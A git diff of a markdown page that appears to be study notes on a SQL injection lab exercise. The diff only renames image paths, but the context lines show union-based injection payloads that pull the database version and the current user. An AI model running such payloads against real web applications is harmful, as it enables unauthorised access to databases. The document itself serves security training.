@@ -113,13 +113,13 @@ we can use the `@@version` SQL query as a test and place it in the second column
 cn' UNION select 1,@@version,3,4-- -
 ```
 
-<figure><img src="../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (59) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Assessment
 
 Use a Union injection to get the result of 'user()'
 
-<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption><p>total of 4 columns</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (38) (1).png" alt=""><figcaption><p>total of 4 columns</p></figcaption></figure>
 
 There are total of 4 columns and displayed 2, 3, and 4 at port code, port city, and port volume repectively
 
@@ -127,5 +127,5 @@ There are total of 4 columns and displayed 2, 3, and 4 at port code, port city, 
 cn' UNION select 1,USER(),3,4-- -
 ```
 
-<figure><img src="../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (91) (1).png" alt=""><figcaption></figcaption></figure>
 
